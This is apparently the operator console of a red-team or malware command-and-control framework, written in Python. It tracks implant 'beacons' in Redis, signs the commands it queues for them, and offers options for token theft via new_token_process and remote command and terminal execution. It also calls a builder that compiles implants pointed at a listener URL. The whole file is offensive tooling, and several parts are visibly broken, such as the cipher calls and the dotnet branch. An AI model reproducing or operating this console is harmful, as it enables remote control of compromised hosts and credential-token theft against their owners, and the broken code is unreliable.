import base64
import subprocess
import redis
from datetime import datetime, time
import json
import cryptography.exceptions
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

import binascii
import os

# Needs a function to wipe the db and make all active beacons check in again
# Right now when the database is wiped, the beacons will not check in again
conn = redis.StrictRedis(host='localhost', port=6379, db=0)
key = b'12345678901234567890123456789012'  # A 256 bit (32 byte) key

ROOT_DIR = os.path.dirname(os.path.abspath(__file__))


def builder(platform, arch, name, listener):
    if subprocess.Popen(f"go run builder.go {platform} {arch} {name} {listener}", shell=True, stdout=subprocess.PIPE,
                     cwd=r'../Builder'):
        print("Finished")



def clearDB():
    for key in conn.scan_iter("*"):
        conn.delete(key)


def decrypt_message(key, ciphertext, nonce):
    backend1 = default_backend()
    salt = b'salt'  # Salt used for key derivation

    # Derive a 256-bit encryption key using PBKDF2
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=backend1
    )
    key = kdf.derive(key)

    # Create a XChaCha20-Poly1305 cipher object
    cipher = Cipher(
        algorithms.XChaCha20(key, nonce),
        mode=None,
        backend=backend1
    )
    decryptor = cipher.decryptor()

    # Decrypt the ciphertext
    plaintext = decryptor.update(ciphertext) + decryptor.finalize()

    return plaintext


def encrypt_message(key, plaintext):
    backend1 = default_backend()
    salt = b'salt'  # Salt used for key derivation

    # Derive a 256-bit encryption key using PBKDF2
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=backend1
    )
    key = kdf.derive(key)

    # Generate a random nonce
    nonce = default_backend().random(bytes(ChaCha20Poly1305.XChaCha20.NONCE_SIZE))

    # Create a XChaCha20-Poly1305 cipher object
    cipher = Cipher(
        ChaCha20Poly1305.XChaCha20(key, nonce),
        mode=None,
        backend=backend1
    )
    encryptor = cipher.encryptor()

    # Encrypt the plaintext
    ciphertext = encryptor.update(plaintext) + encryptor.finalize()

    return ciphertext, nonce


def searchUUID(uuid):
    dt = conn.hget('UUID', uuid)
    dt = dt.decode()  # Decode it from bytes
    lastcheckin = json.loads(dt)  # it's returned as string so convert it to dict
    structure = json.dumps(lastcheckin)  # Dump the dict to json
    connector = json.loads(structure)  # Load it into a new var
    name = connector["WhoAmI"]
    print(name)


while True:
    # We should change this to a help dialogue
    # If command is empty, display the help dialogue
    # Add a GetLastCommand command
    # Add an interact option so that you enter a session with a beacon
    # Sort of akin to Sliver
    # Add an await option. After a command, await the redis update, then display
    # Set command and then await for a new var to be set
    # We will set the retrieved value when it fetches a new command
    # If retrieved is 0, then don't display. If it's 1, display the result and then reset to 0
    inp = input('> ')
    inp = inp.lower()
    if inp == '1':
        print('Commands possible: \n'
              'pwd      - get the current working directory \n'
              'gcu      - get the current user \n'
              'rc       - run a single command \n'
              'rd       - read a directory \n'
              'terminal - Enter a terminal command \n'
              'pid      - returns current PID \n'
              'new_token_process  - Starts a new process with the token of your choice. Expects a PID to steal from and path \n'
              )
        uuid = input('UUID: ')
        # while inp != "exit":  # If the input is exit, break the loop
        choice = input('Command: ')
        choice = choice.lower()
        splits = choice.split()
        if splits[0] == "new_token_process":
            cm = splits[0:]
        if splits[0] == "terminal":
            cm = splits[1:]
            cm = ''.join(cm)
        elif splits[0] == "dotnet":
            path = splits[1:]
            with open(path, "rb") as in_file:
                cm = "dotnet-exe "
                in_file = base64.b64encode(bytes(in_file, 'utf-8'))
                cm.append(in_file)
        else:
            cm = choice
        # I want to preserve the current last check in time
        # so dump the DB and grab that field
        dt = conn.hget('UUID', uuid)  # Get the struct
        dt = dt.decode()  # Decode it from bytes
        lastcheckin = json.loads(dt)  # it's returned as string so convert it to dict
        structure = json.dumps(lastcheckin)  # Dump the dict to json
        connector = json.loads(structure)  # Load it into a new var
        LastInteraction = connector["LastInteraction"]
        whoami = connector["WhoAmI"]
        nonce = connector["Nonce"]
        result = connector["Result"]
        byte_inp = bytes(cm, 'utf-8')

        with open('../Builder/keys/' + uuid + ".pem", "rb") as key_file:  # Read in the pem file for the UUID
            private_key = serialization.load_pem_private_key(key_file.read(), password=None)
        signature = private_key.sign(
            byte_inp,
            padding.PKCS1v15(),
            hashes.SHA256()
        )
        signature_decoded = binascii.b2a_hex(signature).decode()

        with open("../global.pub.pem", "rb") as key_file:  # Read in the pem file for the UUID
            public_key = serialization.load_pem_public_key(key_file.read())
        try:
            public_key.verify(
                signature,
                byte_inp,
                padding.PKCS1v15(),
                hashes.SHA256()
            )
        except cryptography.exceptions.InvalidSignature as e:
            print('ERROR: Payload and/or signature files failed verification!')
            break
        print(signature_decoded)

        b = base64.b64encode(signature)
        # chacha = ChaCha20Poly1305(key)
        # nonce = os.urandom(12)
        # print(nonce)
        # byte_cm = bytes(cm, 'utf-8')
        # cm = chacha.encrypt(nonce, byte_cm, nonce)
        # cm, nonce = encrypt_message(key, cm) # Encrypt the message
        # encode the nonce to string before saving it
        # decoded_nonce = base64.b64encode(nonce).decode('utf-8')
        # chacha.decrypt(nonce, cm, nonce)
        # print(decoded_nonce)
        structure = {
            "WhoAmI": f"{whoami}",
            "Nonce": f"{0}",
            "Signature": f"{signature_decoded}",
            "Retrieved": "1",  # Set retrieved to 1 so we know we got results
            "Command": f"{cm}",
            "LastInteraction": f"{LastInteraction}",
            "LastCheckIn": f"{datetime.today().strftime('%Y-%m-%d %H:%M:%S')}",
            "Result": f"{result}",
            "GotIt": "0"
        }
        structure = json.dumps(structure)  # Dump the json
        # Write the message value to the beacon:UUID key
        conn.hset('UUID', uuid, structure)
        print("Set command... \n")
        # Await the beacon retrieving the command
        # Check the db for an update value
        canWeDisplay = connector["GotIt"]
        print("Waiting for returned data... \n")
        while canWeDisplay == "0":
            # We have to refresh the DB connectors to get updated results it seems
            dt = conn.hget('UUID', uuid)  # Get the struct
            dt = dt.decode()  # Decode it from bytes
            lastcheckin = json.loads(dt)  # it's returned as string so convert it to dict
            structure = json.dumps(lastcheckin)  # Dump the dict to json
            connector = json.loads(structure)  # Load it into a new var
            canWeDisplay = connector["GotIt"]
        result = connector["Result"]
        # print(result)
        # result = base64.decode(result)
        result = bytes(result, 'utf-8')
        print(result)

    elif inp == '2':
        uuid = input('UUID: ')
        searchUUID(uuid)
    elif inp == '3':
        clearDB()
    elif inp == "4":
        subprocess.Popen(["python3", "listener.py"])
    elif inp == "5":
        # print(conn.keys()) # UUID is the key, but we want values from the key
        print(conn.hgetall('UUID'))  # We're searching by hash values here
    elif inp == '6':
        txt = input("Expects platform arch name listener \n"
                       "windows amd64 first http://test.culbertreport:8000 \n"
                       "BUILDER > ")
        splits = txt.split(" ")
        builder(splits[0], splits[1], splits[2], splits[3])

    else:
        print('\n '
              '(1)Enter session \n '
              '(2)Search by UUID \n '
              '(3)Clear DB \n '
              '(4)Start a listener \n '
              '(5)List all \n'
              '(6)Implant builder \n')
